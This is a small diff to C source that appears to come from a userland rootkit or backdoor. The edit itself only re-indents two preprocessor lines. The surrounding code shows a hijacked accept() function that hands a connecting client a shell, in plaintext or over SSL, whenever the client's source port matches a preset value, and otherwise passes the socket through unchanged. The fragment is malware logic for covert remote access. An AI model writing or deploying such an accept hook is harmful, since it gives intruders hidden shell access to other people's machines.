@@ -4,9 +4,9 @@ int hijack_accept(int sockfd, struct sockaddr *addr){
 
     if(htons(sa_i->sin_port) == ACCEPT_PORT) return drop_shell(METHOD_PLAINTEXT, sockfd);
 
-    #ifdef ACCEPT_USE_SSL
+#ifdef ACCEPT_USE_SSL
     if(htons(sa_i->sin_port) == SSL_ACCEPT_PORT) return drop_shell(METHOD_SSL, sockfd);
-    #endif
+#endif
 
     return sockfd;
 }
